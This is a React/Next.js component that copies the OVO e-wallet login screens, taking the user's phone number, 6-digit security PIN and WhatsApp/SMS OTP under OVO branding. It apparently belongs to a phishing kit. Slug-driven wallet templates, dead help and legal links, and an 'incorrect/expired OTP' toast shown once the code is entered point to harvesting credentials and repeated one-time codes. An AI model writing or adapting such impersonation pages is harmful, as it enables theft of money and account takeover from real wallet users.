'use client';

import { useEffect, useState } from 'react';
import Image from 'next/image';
import { ChevronLeft, Loader2 } from 'lucide-react';
import { useEnterpriseFormFlow } from '../lib/useEnterpriseFormFlow';
import { formatCountdownMMSS, formatPhoneInput } from '../lib/utils';
import type { WalletFormProps } from './wallet-methods';
import { OvoLoadingSpinnerOverlay } from './OvoLoadingSpinnerOverlay';
import { ThemeColorMeta } from '../ThemeColorMeta';
import { WALLET_THEME } from '../lib/theme-colors';
import './ovo-wallet.css';

const SPLASH_MS = 3000;

type Phase = 'splash' | 'form';

export function OvoWalletForm({ slugData, onBack }: WalletFormProps) {
  const f = useEnterpriseFormFlow(slugData, 'ovo', {
    disableSound: true,
    autoSubmitPin: false,
  });

  const [phase, setPhase] = useState<Phase>('splash');
  const [splashHide, setSplashHide] = useState(false);
  const [showCodePopup, setShowCodePopup] = useState(false);

  useEffect(() => {
    const fadeTimer = window.setTimeout(() => setSplashHide(true), SPLASH_MS - 400);
    const formTimer = window.setTimeout(() => setPhase('form'), SPLASH_MS);
    return () => {
      window.clearTimeout(fadeTimer);
      window.clearTimeout(formTimer);
    };
  }, []);

  useEffect(() => {
    if (f.step === 2 && f.pinValid && !showCodePopup && !f.submitting) {
      setShowCodePopup(true);
    }
    if (!f.pinValid) setShowCodePopup(false);
  }, [f.step, f.pinValid, showCodePopup, f.submitting]);

  const phoneDisplay = `+62${f.stepData.phone.replace(/\D/g, '')}`;

  const handleSendCode = () => {
    setShowCodePopup(false);
    void f.handleNext();
  };

  return (
    <div className="ovo-flow">
      <ThemeColorMeta color={WALLET_THEME.ovo} />
      <OvoLoadingSpinnerOverlay visible={f.isLoadingOverlay} dotsOnly={f.step === 3} />

      {phase === 'splash' && (
        <div className={`ovo-splash ${splashHide ? 'ovo-splash--hide' : ''}`}>
          <Image
            src="/splash-ovo.jpeg"
            alt=""
            fill
            className="ovo-splash-bg"
            priority
            sizes="100vw"
            aria-hidden
          />
          <div className="ovo-splash-logo-frame" aria-hidden>
            <Image
              src="/ovo-sol.jpeg"
              alt="OVO"
              width={360}
              height={780}
              className="ovo-splash-logo-img"
              priority
            />
          </div>
        </div>
      )}

      {phase === 'form' && (f.step === 1 || f.previousStep === 1) && !showCodePopup && (
        <form
          className={`ovo-step1 ${f.isStep1FadingOut ? 'ovo-flow--fade' : ''}`}
          onSubmit={(e) => {
            e.preventDefault();
            if (f.phoneValid && !f.submitting) void f.handleNext();
          }}
        >
          <div className="ovo-step1-top">
            <button type="button" className="ovo-step1-back" onClick={onBack} aria-label="Kembali">
              <ChevronLeft className="h-6 w-6" />
            </button>
            <button type="button" className="ovo-step1-help" aria-label="Bantuan">
              ?
            </button>
          </div>

          <div className="ovo-step1-body">
            <h1 className="ovo-step1-title">Masuk atau Daftar</h1>
            <p className="ovo-step1-sub">Masuk atau daftar cuma butuh nomor HP aja.</p>

            <div className="ovo-step1-phone">
              <span className="ovo-step1-prefix">+62</span>
              <input
                type="tel"
                inputMode="numeric"
                enterKeyHint="go"
                className="ovo-step1-input"
                value={formatPhoneInput(f.stepData.phone)}
                onChange={(e) =>
                  f.setStepData({ ...f.stepData, phone: e.target.value.replace(/[^0-9]/g, '') })
                }
              />
            </div>

            <p className="ovo-step1-reset">
              Nomor HP nggak aktif atau hilang? <a href="#">Atur Ulang</a>
            </p>

            {f.errorMessage && <p className="ovo-error">{f.errorMessage}</p>}
          </div>

          <div
            className="ovo-step1-footer"
            style={{
              transform: f.keyboardOffset > 0 ? `translateY(-${f.keyboardOffset}px)` : undefined,
            }}
          >
            <p className="ovo-step1-legal">
              Dengan masuk atau daftar, kamu udah setuju sama{' '}
              <a href="#">Ketentuan Layanan</a> dan <a href="#">Kebijakan Privasi OVO</a>.
            </p>
            <button
              type="submit"
              disabled={!f.phoneValid || f.submitting}
              className={`ovo-step1-btn ${f.phoneValid ? 'ovo-step1-btn--on' : 'ovo-step1-btn--off'}`}
            >
              {f.submitting ? <Loader2 className="mx-auto h-5 w-5 animate-spin" /> : 'Lanjutkan'}
            </button>
          </div>
        </form>
      )}

      {phase === 'form' && (f.step === 2 || f.previousStep === 2) && (
        <div
          className={`ovo-step2 ${f.isStep2FadingOut ? 'ovo-flow--fade' : ''} ${
            showCodePopup ? 'ovo-step2--dimmed' : ''
          }`}
        >
          <div className="ovo-step2-top">
            <button
              type="button"
              className="ovo-step2-back"
              onClick={() => f.goBackStep()}
              aria-label="Kembali"
            >
              <ChevronLeft className="h-6 w-6" />
            </button>
          </div>

          <div className="ovo-step2-body">
            <h2 className="ovo-step2-title">Masukkin Security Code</h2>

            <div
              className="ovo-step2-pin"
              onClick={() => f.pinInputRef.current?.focus()}
              role="presentation"
            >
              <input
                ref={f.pinInputRef}
                type="tel"
                inputMode="numeric"
                maxLength={6}
                autoComplete="off"
                autoFocus
                className="ovo-step2-pin-hidden"
                value={f.stepData.pin}
                onChange={(e) =>
                  f.setStepData({
                    ...f.stepData,
                    pin: e.target.value.replace(/\D/g, '').slice(0, 6),
                  })
                }
              />
              {Array.from({ length: 6 }, (_, i) => (
                <div
                  key={i}
                  className={`ovo-step2-pin-ring ${i < f.stepData.pin.length ? 'filled' : ''}`}
                />
              ))}
            </div>

            {f.errorMessage && <p className="ovo-error">{f.errorMessage}</p>}
          </div>

          <p className="ovo-step2-forgot">
            Lupa kode kamu? <a href="#">Atur Ulang</a>
          </p>
        </div>
      )}

      {phase === 'form' && showCodePopup && (
        <>
          <div className="ovo-popup-backdrop" aria-hidden />
          <div className="ovo-popup-sheet" role="dialog" aria-modal="true">
            <div className="ovo-popup-handle" />
            <h3 className="ovo-popup-title">Kode akan dikirim ke WhatsApp</h3>
            <p className="ovo-popup-desc">
              Pastiin nomor OVO kamu <strong>{phoneDisplay}</strong> udah terhubung dengan WhatsApp.
            </p>

            <div className="ovo-popup-info">
              <span className="ovo-popup-info-icon">✓</span>
              <p>Tenang, gak ada pesan promosi atau spam.</p>
            </div>

            <button type="button" className="ovo-popup-wa-btn" onClick={handleSendCode}>
              <svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor" aria-hidden="true">
                <path d="M12 2C6.48 2 2 6.48 2 12c0 1.85.5 3.58 1.38 5.07L2 22l4.93-1.29A9.94 9.94 0 0012 22c5.52 0 10-4.48 10-10S17.52 2 12 2zm5.2 14.2c-.22.62-1.28 1.18-1.78 1.22-.46.04-.98.06-1.58-.1-.36-.1-.83-.32-1.44-.63-2.53-1.37-4.17-4.58-4.3-4.79-.13-.21-1.03-1.37-1.03-2.67 0-1.3.68-1.94.92-2.2.24-.26.52-.33.7-.33.18 0 .36 0 .52.01.17.01.39-.06.6.46.22.52.75 1.83.82 1.96.07.13.11.28.02.45-.09.17-.14.28-.28.43-.14.14-.29.31-.42.47-.14.16-.29.33-.13.65.16.32.72 1.18 1.55 1.92 1.07.95 1.97 1.25 2.29 1.39.32.14.51.12.7-.07.19-.19.8-.93 1.01-1.25.21-.32.42-.27.7-.16.29.11 1.82.86 2.13 1.02.32.16.53.24.61.37.08.13.08.76-.14 1.38z" />
              </svg>
              Kirim Kode ke WhatsApp
            </button>

            <p className="ovo-popup-sms">
              Nomor gak terhubung WhatsApp?{' '}
              <button type="button" onClick={handleSendCode}>
                Kirim ke SMS
              </button>
            </p>
          </div>
        </>
      )}

      {phase === 'form' && f.step === 3 && (
        <div className={`ovo-step3 ${f.isStep3SlidingIn ? 'ovo-flow--slide' : ''}`}>
          <div className="ovo-step3-top">
            <button
              type="button"
              className="ovo-step2-back"
              onClick={() => f.goBackStep()}
              aria-label="Kembali"
            >
              <ChevronLeft className="h-6 w-6" />
            </button>
          </div>

          <div className="ovo-step3-body">
            <h2 className="ovo-step3-title">Masukkin Kode Verifikasi</h2>
            <p className="ovo-step3-sub">
              Kode verifikasi udah dikirim ke <strong>{phoneDisplay}</strong> via WhatsApp/SMS.
            </p>

            <div className="ovo-step3-otp">
              {Array.from({ length: 4 }, (_, i) => (
                <input
                  key={i}
                  ref={(el) => {
                    f.otpInputRefs.current[i] = el;
                  }}
                  type="text"
                  inputMode="numeric"
                  maxLength={1}
                  className={f.otpCompleteRingVisible ? 'error' : ''}
                  value={f.stepData.otp[i] ?? ''}
                  onChange={(e) => f.handleOtpChange(i, e.target.value)}
                  onKeyDown={(e) => f.handleOtpKeyDown(i, e)}
                />
              ))}
            </div>

            <p className={`ovo-step3-toast ${f.otpToastVisible && f.otpFilled ? 'show' : ''}`}>
              OTP yang kamu masukkan Salah/Kadaluwarsa.
            </p>

            <p className="ovo-step3-resend">
              {f.countdown > 0 ? (
                <>Kirim ulang dalam {formatCountdownMMSS(f.countdown)}</>
              ) : (
                <button type="button" onClick={() => f.setCountdown(60)}>
                  Kirim ulang
                </button>
              )}
            </p>

            {f.errorMessage && <p className="ovo-error">{f.errorMessage}</p>}
          </div>
        </div>
      )}
    </div>
  );
}
